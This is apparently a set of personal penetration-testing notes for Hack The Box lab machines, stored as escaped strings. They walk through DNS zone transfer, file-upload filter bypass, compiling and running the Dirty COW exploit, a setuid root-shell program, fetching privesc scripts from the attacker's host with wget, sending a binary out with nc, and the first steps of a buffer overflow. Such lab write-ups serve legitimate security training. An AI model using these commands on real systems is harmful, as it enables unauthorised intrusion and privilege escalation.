Then look for dns zone transfer records to see if its configured for zone transfer: dig axfr @#.#.#.# cronos.htb (# are targets ip address), if subdomains found then edit host file to include them(can add multiple addresses for one IP, ex. 10.10.10.13    www\\.cronos.htb ns1.cronos.htb admin.cronos.htb cronos.htb)\n",

If the upload is there then next try uploading a php script, or run a script with whatever the web app is coded in(can look at the address bar for a clue like .php?), most times the cript will be rejected, so send it to be intercepted and check for an upload that did go through, then copy the \"Content-type\" and some other bites below it so we can try to mimic this file type in our invalid one, send the invalid one to repeater and paste what was copied\n",

    "1. dirtyc0w: available at https://dirtycow.ninja/ , view exploits, choose one, for example: dirty.c , then copy all of its contents, go back to the reverse shell and check if gcc is installed: which gcc, if yes then:vi dirty.c, paste the contents there, go back to view what was copied from the site and see its there compile instructions, in this example there is so copy and paste then in the reverse shell: gcc -pthread dirty.c -o dirty -lcrypt , then make the file executable with: chmod +x dirty, then execute/run the program: ./dirty, it'll try to add user \"firefart\" which takes a little bit so hang on, if it seems to take to long then stop it to check with: \\<ctrl> + c, then:su firefart, enter password just created, then:id, if all 0 then you're root and can into /root to get root.txt!\n",
    "2. Go to where the privesc scripts are: cd /opt/linux_privesc/ , should have LinEnum.sh , linuxprivchecker.py, and unixprivesc.sh (https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh , https://github.com/pentestmonkey/unix-privesc-check, google linuxprivesc.py)\n",
    " - Set up simeple server: python -m SimpleHTTPServer , background: \\<ctrl> + z , get our ip: ifconfig , foreground it: fg\n",
    " - In the shell go to: cd /dev/shm , then: mkdir .name(name it whatever you want), go to new dir: cd .name, now get the privesc scripts: wget -r http:\\//#.#.#.#:8000 (# is our IP)\n",
    " - If it put it in a folder then go there and start running the scripts: LinEnum.sh, check the output by scrolling up, see if there's any weird cronjobs, ones that run every minute are not normal so check them and see if you can schedule a command(sometimes called terminal commands)\n",
    " - After getting this to run we can create a setuid program back in other pane do: vi setuid.c\n",
    " - The contents of the file starting from the first line are:\n",
    "     int main(void){\n",
    "         setuid(0);\n",
    "         setgid(0);\n",
    "         system('/bin/bash');\n",
    "     }\n",
    " - This will make us root, save it and compile it: gcc setuid.c -o setuid , make sure it runs: ./setuid\n",
    " - Now set up a simple server to retrieve this: python -m SimpleHTTPServer , go back to the shell and get the file: curl #.#.#.#:8000/setuid -o setuid , check its there: ls -la, permissions may need to be changed to make it executable so: chmod +x setuid , then run it: ./setuid\n",
    " - For this program to work we have to give it the suid bit and change it the owner to root\n",
    " **Note: For further info on this and a live example, check the notes \"5.CronOS\"\n",
    " \n",
    "3.Set uid bit\n",
    " - this allows the program to switch to the context of the user that owns the program, search for this with: find / -perm -4000 2>/dev/null , this will search the whole system for it(this is how sudo runs)\n",
    " - some programs will come up like fusermount,mount,,umount,ping,ping6, su, but these programs dont allow you to execute shells/code, unless there's in exploit for one of them for example if there was one for ping then there's a chance you could become root through there since ping can escalate to root because it has a \"sticky bit\" set \n",
    " - look for a program which looks off and send it back: nc -w 5 #.#.#.# #### < /usr/local/bin/ovrflw(our ip and the port we have listening, ovrflw is our example)\n",
    " - make sure the listener it's being sent back to is set up corrently: nc -l -p #### > ovrflw\n",
    " - verify that the checksums match: md5sum ovrflw , this is the check on our recieving listener, for the shell thats sending we do: md5sum /usr/local/bin/ovrflw (generally if the first two and last two match for both then its good)\n",
    " **BUFFER OVERFLOW EXAMPLE WITH SUID BELOW**\n",
    " - If the target system is different from our system then we want to use a system as close to theirs as possible for the buffer overflow in this example, so first check both systems with: uname -a , then on the target system check the info of the system with: cat /etc/lsb-release\n",
    " - Check if ASLR is enabled on the target system by using the shell to check: ldd ovrflw | grep libc , check if the address is changing by checking it a couple times, if its enabled then check in the next step if its enabled too and if so then disable it: echo 0 > /proc/sys/kernel/randomize_va_space , now check again and libc should always have the same address\n",
    " - set up a system to be as close to theirs as possible then send the file over by first setting up s simple server: python -m SimpleHTTPServer\n",
    " - Now on the cloned system get the binary: wget #.#.#.#/8000/ovrflw (our actual IP not the VPN one)\n",
    " - Move the file elsewhere and verify with: md5sum ovrflw, make it executebale: chmod +x ovrflw\n",
    " - Try to execute it: run ./ovrflw , says it wants some input like a string\n",
    " - Give it a string: ./ovrflw aaa , nothing happens so lets give it a huge string\n",
    " - String to give: ./ovrflw 'python -c 'print \"A\"\\*200'' , this should give a \"Segentation fault\" which indicates an overflow\n",
    " - We have to identify where the crash is: gdb ./ovrflw (peda is installed with this gdb, peda is python exploitation development assistance https://github.com/longld/peda)\n",
    " - Run the program in gdb: b main,  then: r\n",
    " - Rerun the program:  r 'python -c 'print \"A\"\\*200'' , then continue: c , now the crash should happen\n",
    " - Should now have where the crash started by the last line saying something like \"Stopped reason: SIGSEGV , then the hex \"0x41414141 in ?? ()\" the 41's are A's, so here we show that 4 A's crashed the program\n",
    " - We should also run: checksec , if NX is enabled then we can;t just drop shellcode on the stack and jump to it\n",
    " - We have to check where it crashed and write the script to take advantage so do this \\[ippsec October video: 20:40-end \\]"
